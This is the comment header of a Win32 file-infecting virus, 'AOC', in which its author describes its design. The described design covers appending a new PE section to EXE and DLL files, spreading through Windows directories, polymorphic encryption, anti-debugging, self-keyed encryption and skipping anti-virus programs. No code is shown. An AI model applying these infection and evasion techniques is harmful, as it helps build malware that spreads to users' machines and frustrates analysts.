;
;   . Win32 (assumed, not tested under W2k) run-time virus. Variable
;   multi-layer encryption with polymorphism and key slide. Infects 
;   EXE/DLL files adding new section. Some anti-debug tricks.
;   Uses SEH. Uses CRC32 to find APIs instead of names. Infects the
;   directories: current, windows and system. Updates the CheckSum
;   of PE after infection using its own routine. Avoids infect most
;   used anti-virus.

;   Introduction
;   컴컴컴컴컴컴
;
;   . This is my first win32 PE appender. Another time the name is
;   due to the music i was listening when i coded the virus. This is
;   a song from 'Conan the barbarian' original soundtrack. The main
;   theme of this amazing movie. Yeah, i know. I live in the past ;)
;
;   . As ever i code a new virus i develope a lot of ideas but most
;   are not included in the final version of the virus. May be you
;   wonder why. Some ideas are not compatible and i must decide what
;   to include. This happened some time ago with Deus. This virus
;   will not be finished... but some parts of it were include in
;   other projects like Luna, Anaphilaxys, ... and this virus. I'm
;   not going to explain here what i did for AOC and is not included.
;   hehehe. You'll see it in next viruses ;)
;
;   . I tried to exploit some properties of winblows showing technics
;   really easy to code (if you're experienced win32 coder then skip
;   next two subpoints):
;      - When a DLL is loaded by a process (run-time or at loading
;   time by the system) the DLL main is executed to provide to the
;   DLL a way to do some inits, as example. When a DLL is loaded the
;   system puts it in the same space of addresses of the process that
;   loads the library. And, that is the most important, the work
;   directory of the DLL is the same of the loader. So if we infect
;   a DLL and a process loads it, we must only scan in the work
;   directory for files to infect in the DLL and we get a nice way
;   to spread. But this is limited. If the DLL is loaded in run-time
;   we cannot infect a file being run (the damn OS fucks this kind of
;   modification). Don't worry, there are a lot of posibilities: can
;   be other EXE or DLL there to infect.
;      - In the infection of the PE adding a new section i do another
;   little trick. If we look into the section description we see that
;   Virtual Size is the size of the section into memory, and Physical
;   Size is the size of the section into the file aligned to the...
;   blah, blah. The only one restriction you find is that PS must be
;   less or equal to VS. So nothing is wrong if we set our section's
;   VS to <VirusSize>+<BufferSize>. So the size of the section grows
;   in memory, filling the OS with zeroes the difference. This implies
;   the code is structured in a special way... but nothing you cannot
;   do. And alloc memory during the virus execution is not needed ;)
;   You say when you set up the new section attributes what amount of
;   memory you want, but into the file the section is as small as
;   aligment lets: with 1000h as aligment (as example) the section
;   size will be 1000h bytes in file, but more of 1000h into memory.
;
;   Both tricks, are not tricks. I only coded it following the rules
;   of windoze. This is basic and simple stuff, i know.
;
;   . Trying to do the virus harder to analize i coded LENDE. 'Little
;   ENcryptor/DEcryptor' allows to encrypt little piezes of the
;   virus using the CRC32 of another part of the virus as key.
;
;   컴컴컴컴
;   Features
;   컴컴컴컴
;
;   . Dinamic search for the kernel with SEH:
;       - Windows 95/98
;       - Windows NT
;       - Windows 2000
;
;   . Scans the K32 for the needed APIs using CRC32 instead of names.
;   Takes care of the count of APIs exported from K32. May be in future
;   versions of K32 any API i search is removed... or the name changes.
;   Bah, only makes the virus more stable.
;
;   . Infection adding a new section called '.ntext'. Creates this section
;   with a Virtual Size of <virus size>+<bufferSize> to have a nice buffer
;   when the program is mapped into memory in execution time.
;   I don't need to alloc memory in the virus execution 'cause system
;   does this for me ;) This virus infects PE: both EXE and DLL. SEH used.
;   When the virus jumps back to the host takes care of relocations 'cause
;   this jump is the only one fix address of the virus. The rest uses the
;   delta offset with ebp.
;
;   . AOC infects EXE and DLL in current directory, if current directory
;   is not equal to windows directory then infects DLL into windows dir.
;   Moreover if current directory is not windows\system dir and is not
;   windows dir, it infects all DLL found into windows\system. It's very
;   infectious, so it can slow down the system. Due to this i used size
;   padding as infection sign . So i can know if a file is infected
;   using only findf and findn, that is looking only the size of the
;   file. First execution of the virus in a clean system will be very
;   slow, but not next times.
;
;   . Contains a little trick that allows the virus to check if it's
;   being debugged. If this occurs the virus hangs the process. But
;   if the aver is good using the debugger, there is nothing to do. Due
;   to this i coded LENDE. If the guy debugging modifies some code to
;   avoid a check of the virus, he must restore the change 'cause
;   other pieze of code is encrypted and the decryptor uses it as
;   key of encryption. This is used to protect different parts of
;   the virus i want unmodified. Moreover LENDE works as another layer
;   of encryption. One point aganist: the speed. With two layers of
;   encryption (one polymorphic) the infection part is slow... adding
;   LENDE means more loops.
;   The first time the virus runs in a clean system... hehehe. If
;   you don't have a Pentium better you go and take two beers from
;   the kitchen.
;
;   . Uses variable encryption with polymorphism and two layers of
;   encryption. The second one is not polymorphic and is only 8 bits.
;   The polymorphic one is of 64 bits, variable each 64 bits. This is
;   for avoid the damn emulators finding a generic decryptor. Darkman
;   said me it is: 'Encryption with 64 bits key and slide'. First
;   notice! The polymorphism is like all polys i do: a shit :( Nothing
;   to do at this point, i feel coding polys is damn borring. But i
;   ever do my best! It's a semi-slow polymorphic virus.
;
;   . Avoids infect most used av programs.
;
;   . If the internal counter is bigger than 100h the virus opens a
;   console and writes there its copyright message. Better than simple
;   messagebox ;)
;
;   Enjoy it!
;
;                                                     The way of the bee
;
;
;    Thanx this time goes to Virus Buster for his tests under NT. And to
;   my gf... hehehe i know how embarrassing i was when i did the dissasm
;   of CheckSumMappedFile: this must be love ;)

; How to do a relocation? I save the address that must have my 'inicio'
; address at infection time. Later, at execution time, i get the actual
; address of 'inicio' and sub the fixed address. The result is the
; value i must add to the host old EP to get the new address. I know
; this can be done in other way, like adding a new bank in the reloc
; section of the PE... If you don't take care of this you cannot rely
; in a 'push <addres> ret'. May be is only theory with EXEs, but a file
; not-fixed and/or with relocations can be loaded in different plazes
; than its Image Base. Using this push/ret jump the return address is not
; calculated 'till execution time... hard for an emulator? In the file
; you'll see forever and ever: push 00000000h/ret. Relocation is NEEDED
; with DLL with the push/ret jump. If file not relocated the Image Base
; is the same than Image Base got in execution time, so the sub is zero
; and adding zero to the Host EP we have no change.
;
; Moreover we need to patch the virus 'inicio' 'cause DLL code runs another
; time when is unloaded and we want to run virus once due to the way of
; infection... with another method we could infect at unload too, or only
; at unload. May be next time ;)
